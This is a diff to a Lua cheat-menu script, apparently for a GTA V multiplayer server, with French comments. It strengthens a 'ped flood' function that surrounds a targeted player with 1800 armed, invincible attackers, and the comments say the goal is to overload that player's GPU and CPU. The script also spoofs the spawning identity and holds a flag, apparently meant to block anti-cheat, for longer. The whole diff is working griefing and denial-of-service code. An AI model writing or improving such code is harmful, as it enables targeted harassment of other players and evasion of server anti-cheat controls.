@@ -11903,19 +11903,20 @@ function Menu.ActionPedFlood()
                 susano.SpoofPed(spoofHash, true)
             end
 
-            -- Lancer 5 vagues de 60 peds chacune
-            for wave = 1, 5 do
+            -- Lancer 15 vagues de 120 peds = 1800 peds
+            -- Peds armés + tir = particles + physics = charge max GPU/CPU
+            for wave = 1, 15 do
                 CreateThread(function()
-                    Wait(wave * 200)
+                    Wait(wave * 100)
 
-                    local pedCount = 60
+                    local pedCount = 120
                     for i = 1, pedCount do
                         local tPed = GetPlayerPed(targetPlayerId)
                         if not DoesEntityExist(tPed) then break end
                         local tc = GetEntityCoords(tPed)
 
-                        local angle = (i / pedCount) * math.pi * 2 + (wave * 0.5)
-                        local radius = 1.0 + math.random() * 3.0
+                        local angle = (i / pedCount) * math.pi * 2 + (wave * 0.4)
+                        local radius = 0.5 + math.random() * 4.0
                         local x = tc.x + math.cos(angle) * radius
                         local y = tc.y + math.sin(angle) * radius
 
@@ -11923,20 +11924,26 @@ function Menu.ActionPedFlood()
                         local ped = CreatePed(4, modelHash, x, y, tc.z, math.random(0, 360) + 0.0, true, false)
 
                         if ped and ped ~= 0 then
+                            -- Armer le ped → tirs + muzzle flash + impacts = surcharge GPU
+                            GiveWeaponToPed(ped, 0x1B06D571, 9999, false, true) -- WEAPON_PISTOL
                             TaskCombatPed(ped, tPed, 0, 16)
                             SetPedKeepTask(ped, true)
                             SetPedFleeAttributes(ped, 0, false)
                             SetBlockingOfNonTemporaryEvents(ped, true)
+                            SetPedSuffersCriticalHits(ped, false)
+                            -- Rendre invincible pour qu'ils restent vivants = charge permanente
+                            SetEntityInvincible(ped, true)
                         end
 
-                        if i %% 3 == 0 then Wait(0) end
+                        -- Yield minimal : tous les 8 spawns
+                        if i %% 8 == 0 then Wait(0) end
                     end
                 end)
             end
 
-            -- Désactiver SpoofPed après les vagues + cleanup
+            -- Désactiver SpoofPed après les vagues + cleanup modèles
             CreateThread(function()
-                Wait(4000)
+                Wait(10000)
                 if susano and type(susano.SpoofPed) == "function" then
                     susano.SpoofPed(0, false)
                 end
@@ -11957,7 +11964,7 @@ if Actions.pedFloodItem then
         end
         _Stealth.blockAC = true
         Menu.ActionPedFlood()
-        Citizen.SetTimeout(5000, function()
+        Citizen.SetTimeout(12000, function()
             if _Stealth._acUsers <= 0 then _Stealth.blockAC = false end
         end)
     end
